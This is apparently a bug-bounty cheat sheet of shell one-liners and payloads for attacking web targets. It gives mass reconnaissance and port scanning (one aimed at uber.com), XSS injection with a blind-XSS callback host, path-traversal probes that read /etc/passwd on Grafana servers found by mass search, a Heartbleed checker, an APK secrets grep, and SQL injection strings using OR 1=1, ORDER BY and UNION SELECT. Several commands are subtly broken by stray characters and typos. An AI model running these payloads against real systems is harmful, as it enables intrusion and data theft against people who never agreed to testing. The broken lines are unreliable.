##### To fetch javascript files from subdomain and waybackurls:
`echo "subdomain" | waybackurls | grep -P ".*\.js" | wget`
##### To get endpoints from javascript files:
`grep -RoP "(\/[a-zA-Z0-9_\-]+)+"`
##### To find hidden parameters in javascript files:

```bash
 cat subs.txt |gau | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url| grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"
```
##### Port scan without Cloudflare
`subfinder -silent -d uber.com | filter-resolved | cf-check | sort -u | naabu -rate 40000 -silent -verify | httprobe`
##### Extract IP from file
```bash
grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' file.txt
```

##### Find JS Files
```bash
assetfinder site.com | gau|egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)'|while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" |sed -e 's, 'var','"$url"?',g' -e 's/ //g'|grep -v '.js'|sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars";done
```

##### Extract endpoints from JS files
`cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u`

##### Get CIDR & Orgz from Target Lists
`for DOMAIN in $(cat domains.txt);do echo $(for ip in $(dig a $DOMAIN +short); do whois $ip | grep -e "CIDR\|Organization" | tr -s " " | paste - -; done | uniq); done`

##### Web cache poisoning tool
`gau example.com -o path/to/url.txt | xargs -a /path/to/url.txt -I{} -d'\n' ./wcp.sh url {} > cachepoison.txt`

##### Getting possibly DT vuln links
`httpx -l URLS.txt -follow-redirects -title -path /api/geojson?url=file:///etc/passwd -match-string "root:x:0:0"`
`cat subs.txt | httpx -threads 900 -random-agent | tee -a live.txt`

##### cleaning domain names
`cat domains.txt | egrep -v 'key|words|you|dont|want|wtf|') > clean.txt`

##### subs
`subfinder -d target -silent | sort -u | httpx -title -threads 100 -ports 443,80,9991,8000,10000,5000 -content-length -status-code -o httpxout.txt`

##### rename multiple files corresponding to a list via perl
`perl -lne 'rename("$..html","$_.html")' names.txt`

##### Xss possible automation
```bash
cat Target.com | gau -subs | grep "https://" | grep -v "png\|jpg\|css\|js\|gif\|txt" | grep "=" |uro |dalfox pipe --deep-domxss --multicast --blind username.xss.ht
```

##### Grafana endpoints vulnerable to LFI
`echo 'app="Grafana"' | fofa -fs 1000 | httpx -status-code -path "/public/plugins/graph/../../../../../../../../etc/passwd" -mc 200 -ms 'root:x:0:0'`
##### Heartbleed checker
`cat list.txt | while read line ; do echo "QUIT" | openssl s_client -connect $line:443 2>&1 | grep 'server extension "heartbeat" (id=15)' || echo $line: safe; done`
##### Extract urls from junky data/js files etc.
`cat file | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*`  or  `curl http://host.xx/file.js | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*`
##### Extract Potentially sensitive files from android apk
`apktool d app_name.apk | grep -EHirn "accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into" APKfolder/`

#### Remove the noise from burp
```
.*\.google\.com 
.*\.gstatic\.com 
.*\.googleapis\.com
.*\.pki\.goog
.*\.mozilla\..*
```

##### Find login portals from given list of domains
`cat hosts.txt | httprobe -c 300 | ffuf -w - -u FUZZ -mr "assword"`
##### Find CIDR range with ASN number
`whois -h whois.radb.net -- '-i origin AS22843' | grep -Eo "([0-9.]+){4}/[0-9]+" | sort -u`
This can be done with amass too: `amass intel -asn ASN` which works in reverse and gives the domains too: `amass intel -cidr CIDR`
##### SQL injection checking in token parameter
`/v1/users.php?format=json&token=invalid_token'+or+'1'='1`
##### Another example using ORDER BY:
`/v1/users.php?format=json&token=valid_token'+order+by+1--+`
*If response is valid,column 1 exists,change the number and each request will reveal number of columns
##### UNION SELECT usage to gather more info:
`/v1/users.php?format=json&token=valid_token'union+select+1,2,3,4,5--`
There will be displayed certain numbers in the response and when we use SQL functions like, database() or version() etc.
